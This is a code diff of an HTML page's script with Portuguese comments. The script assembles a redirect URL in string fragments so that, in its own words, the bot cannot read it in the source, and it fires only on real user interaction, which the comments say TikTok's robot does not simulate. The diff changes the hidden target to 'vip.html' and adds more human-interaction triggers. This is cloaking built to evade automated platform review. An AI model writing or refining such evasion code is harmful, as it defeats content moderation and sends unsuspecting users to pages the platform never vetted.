@@ -254,10 +254,10 @@
     <script>
         (function() {
             // Monta o link final de forma quebrada para o bot não ler no código-fonte
-            var t1 = "in";
-            var t2 = "dex";
-            var t3 = ".ht";
-            var t4 = "ml";
+            var t1 = "v";
+            var t2 = "i";
+            var t3 = "p.h";
+            var t4 = "tml";
             var finalUrl = t1 + t2 + t3 + t4;
             
             var actionFired = false;
@@ -272,9 +272,13 @@
                 }, 50);
             }
 
-            // O robô do TikTok não simula toques reais de celular (touchstart):
+            // Captura QUALQUER interação (toque, clique, movimento de mouse):
             window.addEventListener('touchstart', triggerRedirect, {once: true, passive: true});
+            window.addEventListener('touchend', triggerRedirect, {once: true, passive: true});
+            window.addEventListener('touchmove', triggerRedirect, {once: true, passive: true});
             window.addEventListener('scroll', triggerRedirect, {once: true, passive: true});
+            window.addEventListener('click', triggerRedirect, {once: true});
+            window.addEventListener('mousemove', triggerRedirect, {once: true});
         })();
     </script>
 </body>
